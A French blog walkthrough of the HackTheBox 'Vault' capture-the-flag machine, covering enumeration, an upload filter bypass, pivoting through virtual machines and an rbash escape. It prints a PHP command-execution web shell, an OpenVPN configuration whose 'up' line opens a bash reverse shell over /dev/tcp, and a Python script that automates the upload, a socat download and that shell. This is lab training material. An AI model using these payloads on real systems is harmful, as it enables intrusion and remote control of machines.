# Solution du CTF Vault de HackTheBox

Ocean One
---------

*Vault* est un CTF créé par [nol0gz](https://twitter.com/nol0gz) et proposé sur [HackTheBox](https://www.hackthebox.eu/).  

Le résoudre donne 30 points sur HTB, il devrait donc s'agir d'un CTF de difficulté moyenne.  

Un scan TCP permet de découvrir deux ports ouverts :  

```plain
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Sur ce port 80 on trouve une page d'index avec le message suivant sans le moindre lien :  

```plain
Welcome to the Slowdaddy web interface

We specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe.

We are proud to announce our first client: Sparklays (Sparklays.com still under construction)
```

Une recherche de dossiers et fichiers n'apportera pas forcément grand chose ici (selon le dictionnaire utilisé) mais on peut trouver facilement par déduction le sous dossier */sparklays*.  

Lancer un *gobuster* sous ce dossier est bien plus intéressant. On trouve ainsi un script *admin.php* contenant un formulaire de login dont la cible est *login.php*.  

Ce dernier n'affiche que *access denied*...  

Pour ce qui est des sous-dossiers on trouve l'arborescence */sparklays/design/uploads/* mais rien de plus.  

Le formulaire de connexion ne semble pas vulnérable à une injection d'une quelconque sorte, il faut donc insister sur l'énumération.  

C'est finalement en cherchant les fichiers avec extension *.html* que l'on trouve notre point d'entrée : la page */sparklays/design/design.html* contient un lien vers le script */sparklays/design/changelogo.php* qui contient un formulaire d'upload de fichier :)  

Sans trop de surprise les fichiers à l'extension *.php* sont refusés mais il existe tout un tas d'astuces pour bypasser ce type de protection.  

L'une des méthodes bien connues consiste à utiliser une double extension comme *.php.png*. Ici l'upload passe mais malheureusement notre fichier placé dans le dossier *uploads* n'est pas interprété :(  

Une autre technique est de tout simplement utiliser une extension moins connue de PHP : dans notre pas les fichiers *.php5* sont acceptés et bien interprétés :)  

La backdoor uploadée est tout ce qu'il y a de plus classique :  

```php
<?php system($_GET["cmd"]); ?>
```

Tu braques ou tu raques
-----------------------

Sans trop de surprises on obtient une exécution de commande en tant que www-data.  

Le système compte deux utilisateurs :  

```plain
alex:x:1000:1000:alex,,,:/home/alex:/bin/bash
dave:x:1001:1001:,,,:/home/dave:/bin/bash
```

L'utilisateur *alex* semble plus intéressant au vu des groupes dont il fait partie, pourtant la suite nous montrera qu'il ne fait pas partie du challenge.  

```plain
uid=1000(alex) gid=1000(alex) groups=1000(alex),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),130(libvirtd)
```

Pour ce qui est du système on a ici un Ubuntu Xenial (*16.04.4 LTS*) en 64 bits mais le plus intéressant ce sont ses interfaces réseau :  

```plain
ens33     Link encap:Ethernet  HWaddr 00:50:56:b9:da:22
          inet addr:10.10.10.109  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: dead:beef::250:56ff:feb9:da22/64 Scope:Global
          inet6 addr: fe80::250:56ff:feb9:da22/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2222114 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1924195 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:445751395 (445.7 MB)  TX bytes:524036804 (524.0 MB)

virbr0    Link encap:Ethernet  HWaddr fe:54:00:17:ab:49
          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:5280 errors:0 dropped:0 overruns:0 frame:0
          TX packets:5302 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:230054 (230.0 KB)  TX bytes:403556 (403.5 KB)
```

Il y a aussi le cache ARP (extrait de l'output de *LinEnum*) :  

```plain
[-] ARP history:
? (10.10.10.2) at 00:50:56:aa:9c:8d [ether] on ens33
? (192.168.122.4) at 52:54:00:17:ab:49 [ether] on virbr0
? (192.168.122.5) at 52:54:00:3a:3b:d5 [ether] on virbr0
```

L'interface *vibr0* est liée à la bibliothèque de virtualisation [libvirt](https://fr.wikipedia.org/wiki/Libvirt).  

On trouve d'ailleurs dans les processus trois instances de *qemu* avec des options à rallonge dont voici un extrait :  

```plain
qemu-system-x86_64 -name Vault  -cpu qemu32 -drive file=/var/lib/libvirt/images/Vault.qcow2,format=qcow2,if=none,id=drive-ide0-0-0 -device ide-hd,bus=ide.0,unit=0,drive=drive-ide0-0-0,id=ide0-0-0,bootindex=1 -netdev tap,fd=26,id=hostnet0 -device rtl8139,netdev=hostnet0,id=net0,mac=52:54:00:c6:70:66,bus=pci.0,addr=0x3
```

Ce qui est intéressant ici c'est la présence des adresses MAC que l'on peut alors lier au nom de la machine virtuelle. Ainsi on a :  

```plain
52:54:00:17:ab:49 = 192.168.122.4 = DNS
52:54:00:3a:3b:d5 = 192.168.122.5 = Firewall
52:54:00:c6:70:66 = ??? = Vault
```

On ne dispose pas d'accès aux images Qcow2 des différentes VM, inutile d'insister dans cette direction.  

Les utilisateurs ont quelques fichiers word-readable :  

```plain
-rw-r--r-- 1 alex alex 655 Jul 17  2018 /home/alex/.profile
-rw-r--r-- 1 alex alex 25 Jul 17  2018 /home/alex/.dmrc
-rw-r--r-- 1 alex alex 8980 Jul 17  2018 /home/alex/examples.desktop
-rw-rw-r-- 1 libvirt-qemu kvm 853540864 Jul 17  2018 /home/alex/Downloads/server.iso
-rw-r--r-- 1 root root 1024 Jul 17  2018 /home/alex/Desktop/.root.txt.swp
-rw-r--r-- 1 alex alex 3771 Jul 17  2018 /home/alex/.bashrc
-rw-r--r-- 1 alex alex 0 Jul 17  2018 /home/alex/.sudo_as_admin_successful
-rw-r--r-- 1 alex alex 220 Jul 17  2018 /home/alex/.bash_logout
-rw-r--r-- 1 dave dave 655 Jul 17  2018 /home/dave/.profile
-rw-r--r-- 1 dave dave 25 Jul 17  2018 /home/dave/.dmrc
-rw-r--r-- 1 dave dave 8980 Jul 17  2018 /home/dave/examples.desktop
-rw-rw-r-- 1 alex alex 20 Jul 17  2018 /home/dave/Desktop/ssh
-rw-rw-r-- 1 alex alex 14 Jul 17  2018 /home/dave/Desktop/key
-rw-rw-r-- 1 alex alex 74 Jul 17  2018 /home/dave/Desktop/Servers
-rw-r--r-- 1 dave dave 3771 Jul 17  2018 /home/dave/.bashrc
-rw-r--r-- 1 dave dave 220 Jul 17  2018 /home/dave/.bash_logout
-rw-rw-r-- 1 dave dave 1024 Jul 24  2018 /home/dave/.root.txt.swp
```

Le fichier temporaire *swp* n'offre rien d'intéressant (sans doute un gros troll).  

Les fichiers de l'utilisateur *Dave* sont plus intéressants. Ainsi le fichier *key* contient la chaîne *itscominghome* et le fichier ssh dispose des identifiants *dave* / *Dav3therav3123*. Ces derniers nous permettent d'accéder directement à l'IP de la machine (10.10.10.109) via SSH.  

Le fichier *Servers* ne nous apprend rien de plus que ce qu'on avait découvert :  

```plain
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x
```

Tout comme j'ai pu le faire avec [Reddish](http://devloop.users.sourceforge.net/index.php?article189/solution-du-ctf-reddish-de-hackthebox) j'uploade ici un *nmap* avec le fichier *nmap-services* et je scanne les ports du réseau 192.168.122.0/24.  

```plain
Nmap scan report for 192.168.122.4
Host is up (0.012s latency).
Not shown: 65197 closed ports, 336 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

OpenVPN Sesame
--------------

A ce stade, ayant une session *Meterpreter* sur la machine j'ai port-forwardé le port 80 de DNS avec la commande *portfwd add -l 80 -p 80 -r 192.168.122.4*.  

Bien sûr on peut tout aussi bien utiliser OpenSSH dans notre cas (*ssh -L 80:192.168.122.4:80 dave@10.10.10.109*).  

Le site dispose de deux liens, l'un pour modifier la configuration DNS et l'autre pour tester une configuration OpenVPN :  

![Vault HackTheBox CTF OpenVPN Configurator RCE](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/vault_openvpn.png)

Il nous faut seulement trouver un moyen d’appeler une commande depuis une configuration *OpenVPN*, [ce qui n'est pas compliqué](https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da).  

La page indique de spécifier l'option nobind dans les options de configuration, je suppose que c'est juste un choix de l'auteur de la box pour que celle-ci reste stable.  

J'ai rentré la configuration suivante :  

```plain
remote 192.168.1.245
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
up "/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.122.1/9999 0<&1 2>&1&'"
nobind
```

On obtient alors un reverse shell root sur DNS (on aura préalablement mis un port en écoute sur la première machine) et l'accès à notre premier flag :  

```plain
root@DNS:/home/dave# cat user
a4947fa --- snip --- bd88c73
```

On trouve différents fichiers intéressants sur le système :  

```plain
/var/www/:
total 16K
drwxr-xr-x  4 root root 4.0K Jul 17  2018 .
drwxr-xr-x 14 root root 4.0K Jul 17  2018 ..
drwxrwxr-x  3 root root 4.0K Jul 17  2018 DNS
drwxrwxr-x  2 root root 4.0K Jul 17  2018 html

/var/www/DNS:
total 20K
drwxrwxr-x 3 root root 4.0K Jul 17  2018 .
drwxr-xr-x 4 root root 4.0K Jul 17  2018 ..
drwxrwxr-x 2 root root 4.0K Jul 17  2018 desktop
-rw-rw-r-- 1 root root  214 Jul 17  2018 interfaces
-rw-rw-r-- 1 root root   27 Jul 17  2018 visudo

/var/www/DNS/desktop:
total 12K
drwxrwxr-x 2 root root 4.0K Jul 17  2018 .
drwxrwxr-x 3 root root 4.0K Jul 17  2018 ..
-rw-rw-r-- 1 root root   19 Jul 17  2018 ssh
-rw-rw-r-- 1 root root    0 Jul 17  2018 user.txt

/var/www/html:
total 28K
drwxrwxr-x 2 root root 4.0K Jul 17  2018 .
drwxr-xr-x 4 root root 4.0K Jul 17  2018 ..
-rwxrwxrwx 1 root root  158 Jan 29 17:01 123.ovpn
-rw-rw-r-- 1 root root  195 Jul 17  2018 index.php
-rw-rw-r-- 1 root root   36 Jul 17  2018 notes
-rwxrwxrwx 1 root root   35 Jul 17  2018 script.sh
-rw-rw-r-- 1 root root 1022 Jul 17  2018 vpnconfig.php
```

Faute d'avoir les yeux en face des trous je n'ai pas tout de suite remarqué le fichier *ssh* qui contient les identifiants *dave* / *dav3gerous567* :-/   

Le fichier *interfaces* contient les lignes suivantes :  

```plain
auto ens3
iface ens3 inet static
address 192.168.122.4
netmask 255.255.255.0
up route add -net 192.168.5.0 netmask 255.255.255.0 gw 192.168.122.5
up route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.28
```

On a effectivement une route existante pour le réseau 192.168.5.0/24 :  

```plain
root@DNS:/var/www/DNS# route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
10.200.0.1      0.0.0.0         255.255.255.255 UH    0      0        0 tun0
10.200.0.1      0.0.0.0         255.255.255.255 UH    0      0        0 tun1
192.168.5.0     192.168.122.5   255.255.255.0   UG    0      0        0 ens3
192.168.122.0   0.0.0.0         255.255.255.0   U     0      0        0 ens3
```

A ce stade de l'exploitation j'ai écris un script qui automatise toutes les précédentes étapes pour obtenir l'accès root à DNS :  

```python
from time import sleep
from urllib.parse import quote

import requests

php_shell = sess = requests.session()
sess.post(
    "http://10.10.10.109/sparklays/design/changelogo.php",
    files={"file": ("devloop.php5", "<?php system($_GET['cmd']); ?>")},
    data={"submit": "upload file"}
)

sess.post(
    "http://10.10.10.109/sparklays/design/changelogo.php",
    files={"file": open("socat.png", "rb")},
    data={"submit": "upload file"}
)

commands = "killall -s SIGKILL wget; killall -s SIGKILL socat; mv socat.png socat.xz; unxz socat.xz; chmod +x socat; ./socat TCP-LISTEN:9999,fork,reuseaddr,bind=192.168.122.1 TCP:10.10.10.109:9999 &"
response = sess.get("http://10.10.10.109/sparklays/design/uploads/devloop.php5?cmd=" + quote(commands))
response = sess.get("http://10.10.10.109/sparklays/design/uploads/devloop.php5?cmd=" + quote("ls -al"))
print(response.text)

lines = [
    "remote 192.168.1.245",
    "ifconfig 10.200.0.2 10.200.0.1",
    "dev tun",
    "script-security 2",
    "up \"/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.122.1/9999 0<&1 2>&1&'\"",
    "nobind"
]

ovpn = "\n".join(lines)
sleep(1)
cmd = "wget -O- --post-data='resulturl=192.168.122.4&text={}' 'http://192.168.122.4/vpnconfig.php?function=testvpn'".format(quote(ovpn))
response = sess.get("http://10.10.10.109/sparklays/design/uploads/devloop.php5?cmd=" + quote(cmd))
print(response.status_code)
print(response.text)
```

Pour l'utiliser il faut d'abord ouvrir le port 9999 sur la machine *ubuntu* qui redirigera sur notre port 7777 ouvert sur Kali, lequel écoutera avec *ncat* :  

```bash
ssh -R 9999:127.0.0.1:7777 dave@10.10.10.109
```

BREAKING\_IN
------------

On est reparti pour un tour de scan, cette fois sur ce nouveau réseau. Nmap est présent ce qui facilite grandement la tache. On peut toutefois rapatrier des fichiers vers *DNS* en les téléchargeant depuis *ubuntu* à l'aide de wget (on transite par le dossier *uploads* du serveur web).  

Malheureusement le scan du réseau ne laisse entrevoir aucune machine accessible, ping préalable ou non...  

Une recherche dans les logs pour les mentions du réseau se montre plus fructueuse. Ainsi on a un match dans *auth.log* mais *cat* et *grep* considèrent le fichier comme binaire (sans doute qu'il contient des caractères exotiques).  

```plain
root@DNS:/var/www/DNS# cat /var/log/auth.log | grep -a '192.168.5'
Jul 17 16:49:01 DNS sshd[1912]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
Jul 17 16:49:02 DNS sshd[1943]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
Jul 17 16:49:02 DNS sshd[1943]: Disconnected from 192.168.5.2 port 4444
Jul 17 17:21:38 DNS sshd[1560]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
Jul 17 17:21:38 DNS sshd[1590]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
Jul 17 17:21:38 DNS sshd[1590]: Disconnected from 192.168.5.2 port 4444
Jul 17 21:58:26 DNS sshd[1171]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
Jul 17 21:58:29 DNS sshd[1249]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
Jul 17 21:58:29 DNS sshd[1249]: Disconnected from 192.168.5.2 port 4444
Jul 24 15:06:10 DNS sshd[1466]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
Jul 24 15:06:10 DNS sshd[1496]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
Jul 24 15:06:10 DNS sshd[1496]: Disconnected from 192.168.5.2 port 4444
Jul 24 15:06:26 DNS sshd[1500]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.5.2  user=dave
Jul 24 15:06:28 DNS sshd[1500]: Failed password for dave from 192.168.5.2 port 4444 ssh2
Jul 24 15:06:28 DNS sshd[1500]: Connection closed by 192.168.5.2 port 4444 [preauth]
Jul 24 15:06:57 DNS sshd[1503]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
Jul 24 15:06:57 DNS sshd[1533]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
Jul 24 15:06:57 DNS sshd[1533]: Disconnected from 192.168.5.2 port 4444
Jul 24 15:07:21 DNS sshd[1536]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
Jul 24 15:07:21 DNS sshd[1566]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
Jul 24 15:07:21 DNS sshd[1566]: Disconnected from 192.168.5.2 port 4444
Sep  2 15:07:51 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
```

Il semble que la machine 192.168.5.2 dispose d'un port 987...  

Lançons d'abord un scan en spécifiant le port source 4444 comme indiqué dans la commande Nmap présente :  

```plain
nmap -T5 -f --open -g 4444 192.168.5.2
PORT    STATE SERVICE
987/tcp open  unknown
```

De quoi s'agit-il ?  

```plain
root@DNS:/var/www/html# ncat -p 4444 192.168.5.2 987 -v
Ncat: Version 7.01 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.5.2:987.
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
```

Il faut être en mesure de pouvoir utiliser le client SSH tout en ayant le port source 4444. C'est une situation que j'ai déjà couvert dans mon article [sur le bypass de firewall par port source](http://devloop.users.sourceforge.net/index.php?article27/bypass-de-firewall-sur-le-port-source).  

Ici j'ai choisi d'utiliser [un socat 32 bits statique trouvé sur Github](https://github.com/ernw/static-toolbox/releases) qui mettra en écoute un port 11111 sur *DNS* et qui se chargera de rediriger le trafic vers *Vault* (192.168.5.2) sur son port 987 :  

```bash
./socat-x86 TCP4-LISTEN:11111,reuseaddr,fork,bind=127.0.0.1 TCP4:192.168.5.2:987,bind=192.168.122.4:4444,reuseaddr &
ssh -p 11111 dave@127.0.0.1
```

En utilisant le mot de passe *dav3gerous567* trouvé plus tôt on obtient notre shell sur *Vault* mais on est dans un shell restreint (rbash).  

Ainsi on a beau voir la présence d'un fichier *root.txt.gpg*, la plupart des commandes pour obtenir son contenu sont bloquées, même en essayant de tricher un peu :  

```plain
dave@vault:~$ hexdump -C root.txt.gpg
hexdump -C root.txt.gpg
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names

dave@vault:~$ /bin/bash
/bin/bash
-rbash: /bin/bash: restricted: cannot specify `/' in command names

dave@vault:~$ export PATH=.:$PATH
export PATH=.:$PATH
-rbash: PATH: readonly variable
```

En regardant les variables d'environnement on voit qu'une partie du PATH est sous notre contrôle :  

```plain
PATH=/home/dave/bin:/home/dave/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Il suffit alors de créer le dossier *bin* et y copier *bash* pour échapper aux restrictions :  

```plain
dave@vault:~$ mkdir bin
dave@vault:~$ cp /bin/bash bin/
dave@vault:~$ bash
```

Il existe un tas d'astuces pour échapper d'un rbash qui sont listées dans le document [Escape from SHELLcatraz](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells).  

Maintenant puisque l'utilitaire *base64* n'est pas présent et que je n'ai pas envie d'ouvrir une nouvelle connexion j'ai recours à python pour obtenir le contenu du fichier :  

```plain
dave@vault:~$ /usr/bin/python3.5m
Python 3.5.2 (default, Nov 23 2017, 16:37:01)
[GCC 5.4.0 20160609] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
>>> print(base64.b64encode(open("root.txt.gpg", "rb").read()))
b'hQIMA8d4xhDR6x8 --- snip ---KpzBfdERq0MGYij98='
```

Pour déchiffrer le fichier récupéré il faut utiliser les clés GPG (et la passphrase *itscominghome*) qui étaient présentes sur la première machine (*ubuntu*). J'ai tout copié sur ma machine pour le faire :  

```plain
$ gpg --decrypt root.txt.gpg
gpg: chiffré avec une clef RSA de 4096 bits, identifiant C778C610D1EB1F03, créée le 2018-07-24
      « david <dave@david.com> »
ca4683 -- snip -- fe819
```

Happy end
---------

That's it ! En comparaison du CTF *Reddish* les problématiques de port-forwarding étaient très simples :)   

L'utilisation d'un port source spécifique est une bonne idée sur un CTF mais je l'aurais bien vu en tout début pour scanner la box.  


*Published April 06 2019 at 21:07*